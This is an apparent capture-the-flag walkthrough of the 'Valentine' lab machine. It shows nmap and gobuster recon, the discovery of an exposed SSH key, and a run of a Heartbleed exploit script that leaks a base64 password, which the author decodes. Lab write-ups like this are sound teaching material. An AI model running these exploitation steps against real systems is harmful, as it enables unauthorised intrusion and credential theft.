Initiating recon on valentine:
```
nmap -sC -sV 10.10.10.79
```

With the following results:
```

```

Given that it has a page, let's run gobuster to look for other directories
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.79
```


Within the /dev/ directory there's an interesting file, it turns out it is an rsa private key
Let's try to ssh with the key:
```
ssh -i hype_key hype@10.10.10.79
```

We are prompted with the passphrase for hype_key:
```
The authenticity of host '10.10.10.79 (10.10.10.79)' can't be established.
ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'hype_key':

### Enumeration

Lets run another scan to look for vulnerabilities:
```
nmap --script vuln 10.10.10.79
```

The results show that the target machine is vulnerable to heartbleed:

| ssl-heartbleed:
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.

|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.

| ssl-ccs-injection:
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.

```

As it is vulnerable, let's try to exploit it to get an initial foothold
```
python3 heartbleed.py -p 443 -s 10.10.10.79
```

With the following result:
```
#0.0.1/decode.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=={{mw“í:cm
```

The line $text= is a base64 password that decodes to "heartbleedbelievethehype"

Now we can ssh into the machine and gain an initial foothold.
